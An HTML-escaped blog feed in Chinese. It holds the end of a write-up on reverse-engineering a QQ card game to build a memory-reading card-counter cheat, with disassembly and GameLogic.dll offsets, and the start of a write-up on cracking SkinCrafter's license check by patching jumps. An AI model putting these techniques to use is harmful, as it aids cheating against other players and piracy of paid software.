&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFE&lt;/span&gt;                 &lt;span class="no"&gt;push&lt;/span&gt;    &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;DFF&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;esp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E01&lt;/span&gt;                 &lt;span class="no"&gt;sub&lt;/span&gt;     &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E04&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_8&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E07&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;arg_0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E0A&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E0D&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;arg_0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E11&lt;/span&gt;                 &lt;span class="no"&gt;jnz&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020E1C&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E13&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;Eh&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E1A&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020E4B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E1C&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E1C&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E1C&lt;/span&gt; &lt;span class="no"&gt;loc_10020E1C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020DFE+13j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E1C&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;arg_0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E20&lt;/span&gt;                 &lt;span class="no"&gt;jnz&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020E2B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E22&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;Ch&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E29&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020E4B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E2B&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E2B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E2B&lt;/span&gt; &lt;span class="no"&gt;loc_10020E2B&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020DFE+22j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E2B&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;arg_0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;Eh&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E2F&lt;/span&gt;                 &lt;span class="no"&gt;jz&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020E37&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E31&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;arg_0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;Fh&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E35&lt;/span&gt;                 &lt;span class="no"&gt;jnz&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020E42&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E37&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E37&lt;/span&gt; &lt;span class="no"&gt;loc_10020E37&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020DFE+31j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E37&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E3A&lt;/span&gt;                 &lt;span class="no"&gt;add&lt;/span&gt;     &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E3D&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;ecx&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E40&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_10020E4B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E42&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E42&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E42&lt;/span&gt; &lt;span class="no"&gt;loc_10020E42&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020DFE+37j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E42&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E45&lt;/span&gt;                 &lt;span class="no"&gt;sub&lt;/span&gt;     &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E48&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E4B&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E4B&lt;/span&gt; &lt;span class="no"&gt;loc_10020E4B&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                           &lt;span class="c"&gt;; CODE XREF: sub_10020DFE+1Cj&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E4B&lt;/span&gt;                                         &lt;span class="c"&gt;; sub_10020DFE+2Bj ...&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;E4B&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E4E&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E50&lt;/span&gt;                 &lt;span class="no"&gt;pop&lt;/span&gt;     &lt;span class="no"&gt;ebp&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E51&lt;/span&gt;                 &lt;span class="no"&gt;retn&lt;/span&gt;    &lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;E51&lt;/span&gt; &lt;span class="no"&gt;sub_10020DFE&lt;/span&gt;    &lt;span class="no"&gt;endp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这段翻译过来就是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;第一个元素&lt;/span&gt;
&lt;span class="n"&gt;Y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;第三个元素&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;Y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;Y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;Y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;Y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这时候果断脑补：第一个元素可能是1~15，刚好是15种牌的点数（3~10，J，Q，K，A，2，小王F，大王Z）。假设第1个元素就是点数了，那第3个元素是什么呢？根据上面的算法画出对应的表：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;| 3 ~ K  |  A  |  2  |  F  |  Z  |&lt;/span&gt;
&lt;span class="gh"&gt;----------------------------------&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; 1 ~ 11 |  12 |  14 |  15 |  16 |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;有理由这样推测：第3个元素是用来比较牌的点数大小的，而至于为什么A和2之间空一个数，很可能是为顺子设计的，因为顺子只能从3连到A。&lt;/p&gt;
&lt;p&gt;在验证猜想之前还需要做一件事，就是确定牌是按照从大到小还是从小到大排列的，同时确定大小比较是根据牌的点数数值（第1个元素）还是点数大小（第3个元素）决定的。只有四种可能性，依然直接穷举测试。打开CE，设定数据长度为byte，测试牌面点数。最后得到的结论是，牌在内存中是按照点数大小从大到小排列的（最大的牌是数组的起始）。在验证内存数据的过程中，同时确定了每张牌的存储空间是4bytes，前面没法确定的第0个元素实际上是花色：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  王  黑桃  红桃  梅花  方片
-----------------------------
  0    1     2     3     4
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至此，每张牌在内存中的表示方法已经确定：&lt;code&gt;[花色][点数][0][大小]&lt;/code&gt;，每个属性各占1byte，每张牌占4bytes。无论所有玩家出的牌还是玩家自己的牌，只要找到最大一张牌的花色位置和牌的数量，根据每张牌占4bytes，就可以从内存中拿出这组牌数据。下面是我找到的各种情况下最大牌的起始位置（和找座位号时候确定指针的方法一致）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;玩家手里的牌：     [[&amp;quot;GameLogic.dll&amp;quot;+3DAB8]+108]
下家最后出的牌:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+118]
上家最后出的牌:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+2f8]
左家最后出的牌:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+28]
右家最后出的牌:    [[&amp;quot;GameLogic.dll&amp;quot;+3DABC]+208]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所有基址基于GameLogic.dll，而且最后出的牌第一次偏移都是0x3DABC，Good job!&lt;/p&gt;
&lt;h1&gt;Day2 实现逻辑&lt;/h1&gt;
&lt;p&gt;工作量最大最烧脑的Day1过去了，Day2就轻松了很多。写代码之前当然是要确定语言啦，一般来说写外挂都用C++，毕竟要直接和Windows的API打交道。但是为了快（lan），我决定用Python……&lt;/p&gt;
&lt;h2&gt;获取内存数据&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;首先找到游戏的进程，通过进程的可执行文件名skrpg.exe找到相应的进程pid（当然也可以通过窗口标题借助FindWindow来拿pid）。&lt;/li&gt;
&lt;li&gt;根据pid执行OpenProcess。&lt;/li&gt;
&lt;li&gt;由于地址偏移是根据GameLogic.dll这个模块确定的，因此需要读取该模块的基址：利用EnumProcessModulesEx得到所有已经加载的模块的句柄（注意权限为LIST_MODULES_ALL）&lt;/li&gt;
&lt;li&gt;遍历模块句柄，使用GetModuleFileNameEx来得到模块名，找到GameLogic.dll，通过GetModuleInformation得到模块信息，lpBaseOfDll即为模块载入的基址。&lt;/li&gt;
&lt;li&gt;通过ReadProcessMemory获取指定位置和长度的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;很遗憾没有一个完整的库实现了这些API的Python封装，Pywin32也只实现了部分。所以我使用psutil库获取pid，其他都是通过ctype把Python数据转换成C的数据类型后直接调用系统API实现的（此处可以参考WinAppDbg的代码，很可惜它使用Python2.7实现，我用的是3.4，因此不能直接用这个库，需要提取和改写）。&lt;/p&gt;
&lt;h2&gt;主逻辑&lt;/h2&gt;
&lt;p&gt;当所有玩家剩余牌的数量为27时游戏开始，所有数量为0的时候游戏结束（测试发现当游戏结束的时候所有玩家牌会被瞬间置0）。&lt;code&gt;玩家每次出牌数量=上次手里剩下牌的数量-目前手里牌的数量&lt;/code&gt;，当出牌数量不为0的时候（0是不出），则利用这个长度和最大牌的位置读取这组牌。&lt;/p&gt;
&lt;h1&gt;Day3 界面实现&lt;/h1&gt;
&lt;p&gt;既然上了Python的船，图形界面就顺理成章的PyQt了，反正Qt我还是比较熟的，PyQt用法差不了多少。这里要鄙视下PyQt的文档，大部分都依赖于Qt官网，你让只会Python不会C++的怎么搞？&lt;/p&gt;
&lt;p&gt;程序设计为双线程，一个图形线程，一个工作线程，线程间通信通过Qt特有的Signal/Slot实现。&lt;/p&gt;
&lt;p&gt;由于每个人对于记牌器最终功能设计的不一致，所以在写图形界面的时候也会有很大的差异。我目前粗略的实现了显示玩家剩余牌数、已经出的牌以及除了自己的牌以外还剩下的牌。&lt;/p&gt;
&lt;p&gt;这边需要特别说明一下一个不可避免的问题：玩家的座位。当玩家入座后，无论他在游戏大厅中是哪个座位，他的位置一定是显示在最下面的。我上面一直强调无论是玩家剩余的牌数还是玩家打出去的牌，都是根据大厅中的绝对位置来确定的。所以这里涉及到计算相对座位的问题，公式其实很简单：&lt;code&gt;相对座位 = (座位-玩家自己的座位) MOD 4&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;最后上一张成品图：&lt;/p&gt;
&lt;p&gt;&lt;img alt="record" src="../statics/qq-card-game-recorder/recorder.jpg"&gt;&lt;/p&gt;
&lt;h1&gt;DayN 完善和后话&lt;/h1&gt;
&lt;p&gt;找八阿哥（bug）当然是不可缺少的重要一步，不然怎么做第八个男人（Debug Man）呢？&lt;/p&gt;
&lt;p&gt;QQ新双扣角色版的内存数据抓取总的来说没有碰到特别大的问题，主要还是因为数据没有加密，因此可以靠猜想和CE的辅助最终找到数据。GameLogic.dll也没有加壳，所以直接就能在IDA中看反汇编，相对也降低了破解的门槛。联网游戏的破解难度就是实时性，因此很难用OD之类的工具来下断点跟踪，所以推断的能力和阅读静态反汇编的能力需要加强。&lt;/p&gt;</content><category term="crack"></category><category term="reversing"></category><category term="cheater"></category><category term="game"></category><category term="QQ"></category><category term="记牌器"></category><category term="游戏"></category><category term="棋牌"></category></entry><entry><title>SkinCrafter破解笔记</title><link href="http://blog.yyx.me/posts/skincrafter-crack-notes.html" rel="alternate"></link><published>2014-11-09T23:46:00-08:00</published><updated>2014-11-09T23:46:00-08:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-11-09:/posts/skincrafter-crack-notes.html</id><summary type="html">&lt;p&gt;记录了著名VC及.NET皮肤库SkinCrafter(3.8.0 for VS2010)的破解过程，包括license初始化函数破解，弹出框去除以及DEMO文字去除的具体方法及技巧。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;开篇废话&lt;/h1&gt;
&lt;p&gt;最近的一个Win下的小项目，图形界面需求简单，就直接上MFC。完成后某人觉得界面不够和谐，于是得折腾下界面。貌似目前VC++界的UI主流是MS自家DirectUI思想下的一些UI库，可惜本人的哲学“懒”字当头，再学一套UI的用法实在是要了亲命，直接放弃。记得本科期间用过一个Skin++的皮肤库，加载后可以直接换肤，可惜那玩意皮肤太少、没有皮肤编辑器而且貌似已经停止维护，因此作罢。后google到同为皮肤库的SkinCrafter，并下了3.4.4的破解版，可惜在VS2010下整合后MessageBox的按钮底色在Win7下无法匹配皮肤设置（官网查阅后发现是bug，新版已解决），遂换到3.8.0。该版本的VS2012有相关破解版，但VS2010没有，于是自己上手破解（正所谓学会破解，用D版软件都有底气了），花了差不多快2小时最终成功，并记录成本文。&lt;/p&gt;
&lt;h1&gt;Dll版工作流程&lt;/h1&gt;
&lt;p&gt;对于VC/MFC程序，SkinCrafter有Dll/ActiveX两个版本，我个人喜欢使用Dll版（两个版本的破解方法其实是一样的）。下面介绍Dll版本官方的使用方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先需要引入CSCSkin.h和CSCSkin.cpp文件，并将dll及皮肤文件.skf放在目录下。&lt;/li&gt;
&lt;li&gt;实例化CSCSkin对象m_skin，并在App的InitInstance()中执行Init()、LoadSkinFromFile()及ApplySkin()三个函数。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对比ActiveX版本，可以发现少执行好几个函数，其实这些函数在Init()方法中都完成了，所以真正的工作流程是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;定义了Dll导出表中所有的函数指针。&lt;/li&gt;
&lt;li&gt;通过LoadLibrary()加载Dll，并执行InitLicenKeys()和InitDecoration()。&lt;/li&gt;
&lt;li&gt;LoadSkinFromFile()加载皮肤。&lt;/li&gt;
&lt;li&gt;ApplySkin()应用皮肤。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;InitLicenKeys函数破解&lt;/h1&gt;
&lt;p&gt;这个函数用于写入注册信息，对于DEMO版，该函数的4个参数是定死的。其实不破解这个函数也无所谓，反正写在程序里面，但是真要破解也很简单。&lt;/p&gt;
&lt;p&gt;由于是简单的固定字符串匹配，因此可以直接替换Dll中的字符串。当然还可以采用爆破的方法，这样无论输入什么都行。&lt;/p&gt;
&lt;p&gt;查找四个参数中任意一个字符串，我这儿用DEMOSKINCRAFTERLICENCE（比较有代表性），定位到程序。发现有两个处strcmp()比较字符串并作出比较和跳转，因此直接nop掉跳转即可。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;10005A49&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;85C0&lt;/span&gt;          &lt;span class="nt"&gt;test&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
